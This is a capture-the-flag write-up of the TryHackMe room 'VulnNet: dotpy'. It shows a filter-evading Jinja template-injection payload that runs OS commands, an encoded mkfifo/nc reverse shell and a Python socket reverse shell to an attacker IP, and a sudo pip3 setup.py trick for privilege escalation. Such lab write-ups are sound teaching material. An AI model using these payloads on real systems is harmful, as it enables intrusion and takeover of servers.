---
title: Vulnet Dotpy
layout: post
author: Bit Criminals Team
date: 2021-05-17 21:27:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/vulnnetdotpy
---


As usual lets start with the nmap scan...


![](/images/D4rkDemian/dotpy1.png)


We got only one port i.e **8080** and gobuster was not working so using ffuf we found only three directories namely:

```
/login
/register
/logout
```

So we created an account and logged in into the website.


On enumerating we found that if we enter any wrong directory in the url we can see a 400 error page whose content was same eveytime except the input that we give in the url..


![](/images/D4rkDemian/dotpy3.png)


So we guessed it would be template injection and confirmed it by entering **{{7*7}}**.


So now we found an exploit command which will find the os library within the running machine and let us run our commands like **id** , **ls** etc..


```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}```

This worked and we got our output.


![](/images/D4rkDemian/dotpy6.png)


Now lets put our revershell also and listen to our local terminal using nc...

Now the exploit looks as follows 

```py
/%7B%7Brequest|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen'
('rm\x20\x2Ftmp\x2Ff\x3Bmkfifo\x20\x2Ftmp\x2Ff\x3Bcat\x20\x2Ftmp\x2Ff\x7Cbash\x20\x2Di\x202\x3E\x261\x7Cnc\x2010\x2E8\x2E7\x2E41\x201337\x20\x3E\x2Ftmp\x2Ff')|attr('read')()%7D%7D
```

We replaced the percent sign with **\x** and . with **\x2E** as they were getting blocked by the website.

And so we got our shell 

Lets send socat to the shell to make it more stabilized..

After doing `sudo -l` we found that user web had the permission to run /usr/bin/pip3 as system-adm user .


So we created a setup.py file and placed the python reverse shell in it 


```py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.7.41",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /tmp/shell/setup.py
```


Now listen on your local machine and run the following command in the shell 

```sudo -u system-adm /usr/bin/pip3 install /tmp/shell```

And now we are system-adm 


